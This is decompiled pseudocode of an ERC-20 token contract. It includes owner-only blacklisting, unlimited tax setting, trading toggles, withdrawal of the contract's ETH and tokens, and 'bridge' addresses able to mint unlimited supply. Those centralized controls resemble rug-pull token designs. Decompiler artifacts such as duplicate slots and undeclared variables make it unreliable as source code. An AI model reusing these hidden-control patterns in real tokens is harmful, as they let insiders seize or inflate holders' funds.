contract main {




// =====================  Runtime code  =====================


#
#  - transferFrom(address arg1, address arg2, uint256 arg3)
#  - initialize()
#  - transfer(address arg1, uint256 arg2)
#  - _fallback()
#
const decimals = 18


mapping of uint256 balanceOf;
mapping of uint256 allowance;
uint256 totalSupply;
array of struct stor54;
array of struct stor55;
address owner;
address contractAddress;
address w1Address;
address w2Address;
address DEADAddress;
address zeroAddress;
address lpPairAddress;
address swapTokenAddress;
address usdtAddress;
address sub_73176e5fAddress;
address airdropAddress;
uint256 swapThreshold;
uint256 stor117;
uint256 stor118;
uint256 stor119;
uint256 stor120;
uint256 stor121;
uint256 stor122;
uint256 stor123;
uint256 stor124;
uint8 tradingActive; offset 8
uint8 transferDelayEnabled; offset 24
uint8 sub_20bc343f; offset 32
uint8 contractSwapEnabled; offset 40
uint8 sub_b7cce31f; offset 48
uint256 stor126; offset 48
uint256 stor126; offset 40
uint256 stor126; offset 32
uint256 stor126; offset 24
uint256 stor126; offset 16
uint256 stor126; offset 8
mapping of uint8 stor127;
mapping of uint8 stor128;
mapping of uint8 stor129;
mapping of uint8 stor130;
mapping of uint8 stor131;
mapping of uint8 stor133;
address dexRouterAddress;
uint16 stor135;
uint16 stor135; offset 16
uint16 stor135; offset 32
address sub_9bb5cd3fAddress;

function w2() {
    return w2Address
}

function DEAD() {
    return DEADAddress
}

function swapThreshold() {
    return swapThreshold
}

function dexRouter() {
    return dexRouterAddress
}

function totalSupply() {
    return totalSupply
}

function _isBlacklisted(address arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    return bool(stor128[arg1])
}

function sub_20bc343f(?) {
    return bool(sub_20bc343f)
}

function lpPair() {
    return lpPairAddress
}

function isExcludedFromFee(address arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    return bool(stor133[address(arg1)])
}

function balanceOf(address arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    return balanceOf[address(arg1)]
}

function sub_73176e5f(?) {
    return sub_73176e5fAddress
}

function w1() {
    return w1Address
}

function airdropAddress() {
    return airdropAddress
}

function getOwner() {
    return owner
}

function owner() {
    return owner
}

function usdtAddress() {
    return usdtAddress
}

function sub_9bb5cd3f(?) {
    return sub_9bb5cd3fAddress
}

function sub_abf2d17e(?) {
    require calldata.size - 4 >= 32
    require arg1 <= test266151307()
    require arg1 + 35 < calldata.size
    if arg1.length > test266151307():
        revert with 0, 65
    if ceil32(ceil32(arg1.length)) + 97 < 96 or ceil32(ceil32(arg1.length)) + 97 > test266151307():
        revert with 0, 65
    require arg1 + arg1.length + 36 <= calldata.size
    return bool(stor127[arg1[all]])
}

function automatedMarketMakerPairs(address arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    return bool(stor129[arg1])
}

function sub_b7cce31f(?) {
    return bool(sub_b7cce31f)
}

function tradingActive() {
    return bool(tradingActive)
}

function zero() {
    return zeroAddress
}

function transferDelayEnabled() {
    return bool(transferDelayEnabled)
}

function bridges(address arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    return bool(stor130[arg1])
}

function allowance(address arg1, address arg2) {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    return allowance[address(arg1)][address(arg2)]
}

function swapTokenAddress() {
    return swapTokenAddress
}

function contractAddress() {
    return contractAddress
}

function contractSwapEnabled() {
    return bool(contractSwapEnabled)
}

function sub_069d955f(?) {
    return uint16(stor135.field_0), uint16(stor135.field_0), uint16(stor135.field_32)
}

function sub_042f0c1b(?) {
    require calldata.size - 4 >= 32
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    stor118 = arg1
}

function sub_1630e97f(?) {
    require calldata.size - 4 >= 32
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    stor117 = arg1
}

function setSwapThreshold(uint256 arg1) {
    require calldata.size - 4 >= 32
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    swapThreshold = arg1
}

function transferOwnership(address arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    owner = arg1
}

function sub_8af65ce8(?) {
    require calldata.size - 4 >= 32
    require arg1 == address(arg1)
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    w1Address = address(arg1)
}

function sub_de747cec(?) {
    require calldata.size - 4 >= 32
    require arg1 == address(arg1)
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    w2Address = address(arg1)
}

function excludeFromFee(address arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    stor133[address(arg1)] = 1
}

function updateAirdropAddress(address arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    airdropAddress = arg1
}

function enableTrading(bool arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    Mask(248, 0, stor126.field_8) = Mask(248, 0, arg1)
}

function sub_780e1154(?) {
    require calldata.size - 4 >= 32
    require arg1 == bool(arg1)
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    Mask(216, 0, stor126.field_40) = Mask(216, 0, bool(arg1))
}

function sub_8d0cb35a(?) {
    require calldata.size - 4 >= 32
    require arg1 == bool(arg1)
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    Mask(240, 0, stor126.field_16) = Mask(240, 0, bool(arg1))
}

function sub_a2065e71(?) {
    require calldata.size - 4 >= 32
    require arg1 == bool(arg1)
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    Mask(232, 0, stor126.field_24) = Mask(232, 0, bool(arg1))
}

function sub_ce4a2c5f(?) {
    require calldata.size - 4 >= 32
    require arg1 == bool(arg1)
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    Mask(224, 0, stor126.field_32) = Mask(224, 0, bool(arg1))
}

function sub_e47176bc(?) {
    require calldata.size - 4 >= 32
    require arg1 == bool(arg1)
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    Mask(208, 0, stor126.field_48) = Mask(208, 0, bool(arg1))
}

function updateTradingEnable(bool arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    Mask(248, 0, stor126.field_8) = Mask(248, 0, arg1)
}

function sub_b1ee5a81(?) {
    require calldata.size - 4 >= 64
    require arg1 == address(arg1)
    require arg2 == bool(arg2)
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    stor128[address(arg1)] = uint8(bool(arg2))
}

function sub_a6791cec(?) {
    require calldata.size - 4 >= 32
    require arg1 == address(arg1)
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    sub_73176e5fAddress = address(arg1)
    sub_9bb5cd3fAddress = address(arg1)
}

function sub_3c1963c7(?) {
    require calldata.size - 4 >= 192
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    stor119 = arg1
    stor122 = arg2
    stor120 = arg3
    stor123 = arg4
    stor121 = arg5
    stor124 = arg6
}

function setPairAddress(address arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    lpPairAddress = arg1
    stor129[address(arg1)] = 1
    emit 0xa1b660d3: msg.sender, dexRouterAddress, arg1
}

function setAutomatedMarketMakerPair(address arg1, bool arg2) {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    lpPairAddress = arg1
    stor129[address(arg1)] = uint8(arg2)
}

function sub_2479743c(?) {
    require calldata.size - 4 >= 64
    require arg1 == address(arg1)
    require arg2 == bool(arg2)
    if bool(stor130[msg.sender]) != 1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'Only Bridge: caller is not the owner'
    stor130[address(arg1)] = uint8(bool(arg2))
}

function sub_859b1c3a(?) {
    require calldata.size - 4 >= 32
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    if not eth.balance(contractAddress):
        revert with 0, 'Contract balance is zero'
    call msg.sender with:
       value eth.balance(contractAddress) wei
         gas gas_remaining wei
}

function setTaxes(uint16 arg1, uint16 arg2, uint16 arg3) {
    require calldata.size - 4 >= 96
    require arg1 == arg1
    require arg2 == arg2
    require arg3 == arg3
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    uint16(stor135.field_0) = arg1
    uint16(stor135.field_16) = arg2
    uint16(stor135.field_32) = arg3
}

function approve(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve from the zero address'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve to the zero address'
    allowance[address(msg.sender)][address(arg1)] = arg2
    emit Approval(arg2, msg.sender, arg1);
    return 1
}

function sub_30823c82(?) {
    require calldata.size - 4 >= 64
    require arg1 == address(arg1)
    if bool(stor130[msg.sender]) != 1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'Only Bridge: caller is not the owner'
    if not address(arg1):
        revert with 0, 'ERC20: mint to the zero address'
    if totalSupply > !arg2:
        revert with 0, 17
    totalSupply += arg2
    if balanceOf[address(arg1)] > !arg2:
        revert with 0, 17
    balanceOf[address(arg1)] += arg2
    emit Transfer(arg2, 0, address(arg1));
}

function increaseAllowance(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    if allowance[msg.sender][address(arg1)] > !arg2:
        revert with 0, 17
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve from the zero address'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve to the zero address'
    allowance[address(msg.sender)][address(arg1)] = allowance[msg.sender][address(arg1)] + arg2
    emit Approval((allowance[msg.sender][address(arg1)] + arg2), msg.sender, arg1);
    return 1
}

function sub_ec16cfc7(?) {
    require calldata.size - 4 >= 32
    require arg1 == address(arg1)
    staticcall dexRouterAddress.factory() with:
            gas gas_remaining wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
    staticcall address(ext_call.return_data[0]).0xe6a43905 with:
            gas gas_remaining wei
           args address(arg1), this.address
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
    return ext_call.return_data[12 len 20]
}

function decreaseAllowance(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    if allowance[msg.sender][address(arg1)] < arg2:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: decreased allowance below zero'
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve from the zero address'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve to the zero address'
    allowance[address(msg.sender)][address(arg1)] = allowance[msg.sender][address(arg1)] - arg2
    emit Approval((allowance[msg.sender][address(arg1)] - arg2), msg.sender, arg1);
    return 1
}

function getPair(address arg1, address arg2) {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    staticcall dexRouterAddress.factory() with:
            gas gas_remaining wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
    staticcall address(ext_call.return_data[0]).0xe6a43905 with:
            gas gas_remaining wei
           args address(arg1), arg2
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
    return ext_call.return_data[12 len 20]
}

function sub_93d5e449(?) {
    require calldata.size - 4 >= 64
    require arg1 <= test266151307()
    require arg1 + 35 < calldata.size
    if arg1.length > test266151307():
        revert with 0, 65
    if ceil32(ceil32(arg1.length)) + 97 < 96 or ceil32(ceil32(arg1.length)) + 97 > test266151307():
        revert with 0, 65
    mem[96] = arg1.length
    require arg1 + arg1.length + 36 <= calldata.size
    mem[128 len arg1.length] = arg1[all]
    mem[arg1.length + 128] = 0
    require arg2 == bool(arg2)
    if bool(stor130[msg.sender]) != 1:
        revert with 0, 'Only Bridge: caller is not the owner'
    mem[ceil32(ceil32(arg1.length)) + 97 len ceil32(arg1.length)] = arg1[all], mem[arg1.length + 128 len ceil32(arg1.length) - arg1.length]
    mem[arg1.length + ceil32(ceil32(arg1.length)) + 97] = 127
    stor[sha3(mem[ceil32(ceil32(arg1.length)) + 97 len arg1.length + 32])] = uint8(bool(arg2))
}

function sub_8e04c484(?) {
    if balanceOf[address(msg.sender)] <= 0:
        revert with 0, 'zero balance'
    if stor131[msg.sender]:
        revert with 0, 'already airdrop balance'
    if not airdropAddress:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer from the zero address'
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer to the zero address'
    if balanceOf[stor112] < balanceOf[address(msg.sender)]:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer amount exceeds balance'
    balanceOf[stor112] -= balanceOf[address(msg.sender)]
    if balanceOf[msg.sender] > !balanceOf[address(msg.sender)]:
        revert with 0, 17
    balanceOf[msg.sender] += balanceOf[address(msg.sender)]
    emit Transfer(balanceOf[address(msg.sender)], airdropAddress, msg.sender);
}

function sub_5e6710de(?) {
    require calldata.size - 4 >= 32
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    staticcall contractAddress.0x70a08231 with:
            gas gas_remaining wei
           args msg.sender
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    if ext_call.return_data[0] <= 0:
        revert with 0, 'Contract balance is zero'
    if arg1 <= ext_call.return_data[0]:
        call contractAddress.0x23b872dd with:
             gas gas_remaining wei
            args contractAddress, msg.sender, arg1
    else:
        call contractAddress.0x23b872dd with:
             gas gas_remaining wei
            args contractAddress, msg.sender, ext_call.return_data[0]
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    require ext_call.return_data[0] == bool(ext_call.return_data[0])
}

function burn(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    if arg1 != msg.sender:
        if allowance[address(arg1)][address(msg.sender)] != -1:
            if allowance[address(arg1)][address(msg.sender)] < arg2:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer amount exceeds allowance'
    if arg2 > balanceOf[address(arg1)]:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'Burn amount should be less than account balance'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: burn from the zero address'
    if balanceOf[address(arg1)] < arg2:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: burn amount exceeds balance'
    balanceOf[address(arg1)] -= arg2
    if totalSupply < arg2:
        revert with 0, 17
    totalSupply -= arg2
    emit Transfer(arg2, arg1, 0);
    emit Burn(arg2, arg1);
}

function sub_46860c9b(?) {
    require calldata.size - 4 >= 64
    require arg1 == address(arg1)
    if address(arg1) != msg.sender:
        if allowance[address(arg1)][address(msg.sender)] != -1:
            if allowance[address(arg1)][address(msg.sender)] < arg2:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer amount exceeds allowance'
    if arg2 > balanceOf[address(arg1)]:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'Burn amount should be less than account balance'
    if not address(arg1):
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer from the zero address'
    if not contractAddress:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer to the zero address'
    if balanceOf[address(arg1)] < arg2:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer amount exceeds balance'
    balanceOf[address(arg1)] -= arg2
    if balanceOf[stor103] > !arg2:
        revert with 0, 17
    balanceOf[stor103] += arg2
    emit Transfer(arg2, address(arg1), contractAddress);
    emit Burn(arg2, address(arg1));
}

function sub_f6af2a47(?) {
    require calldata.size - 4 >= 32
    mem[128] = contractAddress
    mem[160] = usdtAddress
    mem[192] = 0xd06ca61f00000000000000000000000000000000000000000000000000000000
    mem[196] = arg1
    mem[228] = 64
    mem[260] = 2
    idx = 0
    s = 128
    t = 292
    while idx < 2:
        mem[t] = mem[s + 12 len 20]
        idx = idx + 1
        s = s + 32
        t = t + 32
        continue 
    staticcall dexRouterAddress.getAmountsOut(uint256 arg1, address[] arg2) with:
            gas gas_remaining wei
           args arg1, Array(len=2, data=mem[292 len 64])
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    mem[192 len return_data.size] = ext_call.return_data[0 len return_data.size]
    mem[64] = ceil32(return_data.size) + 192
    require return_data.size >= 32
    _26 = mem[192 len 4], Mask(224, 32, arg1) >> 32
    require mem[192 len 4], Mask(224, 32, arg1) >> 32 <= test266151307()
    require mem[192 len 4], Mask(224, 32, arg1) >> 32 + 223 < return_data.size + 192
    _27 = mem[mem[192 len 4], Mask(224, 32, arg1) >> 32 + 192]
    if mem[mem[192 len 4], Mask(224, 32, arg1) >> 32 + 192] > test266151307():
        revert with 0, 65
    if ceil32(32 * mem[mem[192 len 4], Mask(224, 32, arg1) >> 32 + 192]) + 1 < 0 or ceil32(return_data.size) + ceil32(32 * mem[mem[192 len 4], Mask(224, 32, arg1) >> 32 + 192]) + 193 > test266151307():
        revert with 0, 65
    mem[64] = ceil32(return_data.size) + ceil32(32 * mem[mem[192 len 4], Mask(224, 32, arg1) >> 32 + 192]) + 193
    mem[ceil32(return_data.size) + 192] = mem[mem[192 len 4], Mask(224, 32, arg1) >> 32 + 192]
    require _26 + (32 * _27) + 32 <= return_data.size
    mem[ceil32(return_data.size) + 224 len ceil32(32 * _27)] = mem[_26 + 224 len ceil32(32 * _27)]
    if 1 >= _27:
        revert with 0, 50
    if mem[ceil32(return_data.size) + 256] > stor119:
        return stor122
    if mem[ceil32(return_data.size) + 256] > stor120:
        return stor123
    if mem[ceil32(return_data.size) + 256] <= stor121:
        return 0
    return stor124
}

function name() {
    if bool(stor54.length):
        if not bool(stor54.length) - (uint255(stor54.length) * 0.5 < 32):
            revert with 0, 34
        if bool(stor54.length):
            if not bool(stor54.length) - (uint255(stor54.length) * 0.5 < 32):
                revert with 0, 34
            if Mask(256, -1, stor54.length):
                if 31 < uint255(stor54.length) * 0.5:
                    mem[128] = uint256(stor54.field_0)
                    idx = 128
                    s = 0
                    while (uint255(stor54.length) * 0.5) + 96 > idx:
                        mem[idx + 32] = uint256(stor54[s].field_256)
                        idx = idx + 32
                        s = s + 1
                        continue 
                    return Array(len=2 * Mask(256, -1, stor54.length), data=mem[128 len ceil32(uint255(stor54.length) * 0.5)])
                mem[128] = 256 * Mask(248, 0, stor54.length.field_8)
        else:
            if not bool(stor54.length) - (stor54.length.field_1 % 128 < 32):
                revert with 0, 34
            if stor54.length.field_1 % 128:
                if 31 < stor54.length.field_1 % 128:
                    mem[128] = uint256(stor54.field_0)
                    idx = 128
                    s = 0
                    while stor54.length.field_1 % 128 + 96 > idx:
                        mem[idx + 32] = uint256(stor54[s].field_256)
                        idx = idx + 32
                        s = s + 1
                        continue 
                    return Array(len=2 * Mask(256, -1, stor54.length), data=mem[128 len ceil32(uint255(stor54.length) * 0.5)])
                mem[128] = 256 * Mask(248, 0, stor54.length.field_8)
        mem[ceil32(uint255(stor54.length) * 0.5) + 192 len ceil32(uint255(stor54.length) * 0.5)] = mem[128 len ceil32(uint255(stor54.length) * 0.5)]
        if ceil32(uint255(stor54.length) * 0.5) > uint255(stor54.length) * 0.5:
            mem[(uint255(stor54.length) * 0.5) + ceil32(uint255(stor54.length) * 0.5) + 192] = 0
        return Array(len=2 * Mask(256, -1, stor54.length), data=mem[128 len ceil32(uint255(stor54.length) * 0.5)], mem[(2 * ceil32(uint255(stor54.length) * 0.5)) + 192 len 2 * ceil32(uint255(stor54.length) * 0.5)]), 
    if not bool(stor54.length) - (stor54.length.field_1 % 128 < 32):
        revert with 0, 34
    if bool(stor54.length):
        if not bool(stor54.length) - (uint255(stor54.length) * 0.5 < 32):
            revert with 0, 34
        if Mask(256, -1, stor54.length):
            if 31 < uint255(stor54.length) * 0.5:
                mem[128] = uint256(stor54.field_0)
                idx = 128
                s = 0
                while (uint255(stor54.length) * 0.5) + 96 > idx:
                    mem[idx + 32] = uint256(stor54[s].field_256)
                    idx = idx + 32
                    s = s + 1
                    continue 
                return Array(len=stor54.length % 128, data=mem[128 len ceil32(stor54.length.field_1 % 128)])
            mem[128] = 256 * Mask(248, 0, stor54.length.field_8)
    else:
        if not bool(stor54.length) - (stor54.length.field_1 % 128 < 32):
            revert with 0, 34
        if stor54.length.field_1 % 128:
            if 31 < stor54.length.field_1 % 128:
                mem[128] = uint256(stor54.field_0)
                idx = 128
                s = 0
                while stor54.length.field_1 % 128 + 96 > idx:
                    mem[idx + 32] = uint256(stor54[s].field_256)
                    idx = idx + 32
                    s = s + 1
                    continue 
                return Array(len=stor54.length % 128, data=mem[128 len ceil32(stor54.length.field_1 % 128)])
            mem[128] = 256 * Mask(248, 0, stor54.length.field_8)
    mem[ceil32(stor54.length.field_1 % 128) + 192 len ceil32(stor54.length.field_1 % 128)] = mem[128 len ceil32(stor54.length.field_1 % 128)]
    if ceil32(stor54.length.field_1 % 128) > stor54.length.field_1 % 128:
        mem[stor54.length.field_1 % 128 + ceil32(stor54.length.field_1 % 128) + 192] = 0
    return Array(len=stor54.length % 128, data=mem[128 len ceil32(stor54.length.field_1 % 128)], mem[(2 * ceil32(stor54.length.field_1 % 128)) + 192 len 2 * ceil32(stor54.length.field_1 % 128)]), 
}

function symbol() {
    if bool(stor55.length):
        if not bool(stor55.length) - (uint255(stor55.length) * 0.5 < 32):
            revert with 0, 34
        if bool(stor55.length):
            if not bool(stor55.length) - (uint255(stor55.length) * 0.5 < 32):
                revert with 0, 34
            if Mask(256, -1, stor55.length):
                if 31 < uint255(stor55.length) * 0.5:
                    mem[128] = uint256(stor55.field_0)
                    idx = 128
                    s = 0
                    while (uint255(stor55.length) * 0.5) + 96 > idx:
                        mem[idx + 32] = uint256(stor55[s].field_256)
                        idx = idx + 32
                        s = s + 1
                        continue 
                    return Array(len=2 * Mask(256, -1, stor55.length), data=mem[128 len ceil32(uint255(stor55.length) * 0.5)])
                mem[128] = 256 * Mask(248, 0, stor55.length.field_8)
        else:
            if not bool(stor55.length) - (stor55.length.field_1 % 128 < 32):
                revert with 0, 34
            if stor55.length.field_1 % 128:
                if 31 < stor55.length.field_1 % 128:
                    mem[128] = uint256(stor55.field_0)
                    idx = 128
                    s = 0
                    while stor55.length.field_1 % 128 + 96 > idx:
                        mem[idx + 32] = uint256(stor55[s].field_256)
                        idx = idx + 32
                        s = s + 1
                        continue 
                    return Array(len=2 * Mask(256, -1, stor55.length), data=mem[128 len ceil32(uint255(stor55.length) * 0.5)])
                mem[128] = 256 * Mask(248, 0, stor55.length.field_8)
        mem[ceil32(uint255(stor55.length) * 0.5) + 192 len ceil32(uint255(stor55.length) * 0.5)] = mem[128 len ceil32(uint255(stor55.length) * 0.5)]
        if ceil32(uint255(stor55.length) * 0.5) > uint255(stor55.length) * 0.5:
            mem[(uint255(stor55.length) * 0.5) + ceil32(uint255(stor55.length) * 0.5) + 192] = 0
        return Array(len=2 * Mask(256, -1, stor55.length), data=mem[128 len ceil32(uint255(stor55.length) * 0.5)], mem[(2 * ceil32(uint255(stor55.length) * 0.5)) + 192 len 2 * ceil32(uint255(stor55.length) * 0.5)]), 
    if not bool(stor55.length) - (stor55.length.field_1 % 128 < 32):
        revert with 0, 34
    if bool(stor55.length):
        if not bool(stor55.length) - (uint255(stor55.length) * 0.5 < 32):
            revert with 0, 34
        if Mask(256, -1, stor55.length):
            if 31 < uint255(stor55.length) * 0.5:
                mem[128] = uint256(stor55.field_0)
                idx = 128
                s = 0
                while (uint255(stor55.length) * 0.5) + 96 > idx:
                    mem[idx + 32] = uint256(stor55[s].field_256)
                    idx = idx + 32
                    s = s + 1
                    continue 
                return Array(len=stor55.length % 128, data=mem[128 len ceil32(stor55.length.field_1 % 128)])
            mem[128] = 256 * Mask(248, 0, stor55.length.field_8)
    else:
        if not bool(stor55.length) - (stor55.length.field_1 % 128 < 32):
            revert with 0, 34
        if stor55.length.field_1 % 128:
            if 31 < stor55.length.field_1 % 128:
                mem[128] = uint256(stor55.field_0)
                idx = 128
                s = 0
                while stor55.length.field_1 % 128 + 96 > idx:
                    mem[idx + 32] = uint256(stor55[s].field_256)
                    idx = idx + 32
                    s = s + 1
                    continue 
                return Array(len=stor55.length % 128, data=mem[128 len ceil32(stor55.length.field_1 % 128)])
            mem[128] = 256 * Mask(248, 0, stor55.length.field_8)
    mem[ceil32(stor55.length.field_1 % 128) + 192 len ceil32(stor55.length.field_1 % 128)] = mem[128 len ceil32(stor55.length.field_1 % 128)]
    if ceil32(stor55.length.field_1 % 128) > stor55.length.field_1 % 128:
        mem[stor55.length.field_1 % 128 + ceil32(stor55.length.field_1 % 128) + 192] = 0
    return Array(len=stor55.length % 128, data=mem[128 len ceil32(stor55.length.field_1 % 128)], mem[(2 * ceil32(stor55.length.field_1 % 128)) + 192 len 2 * ceil32(stor55.length.field_1 % 128)]), 
}



}
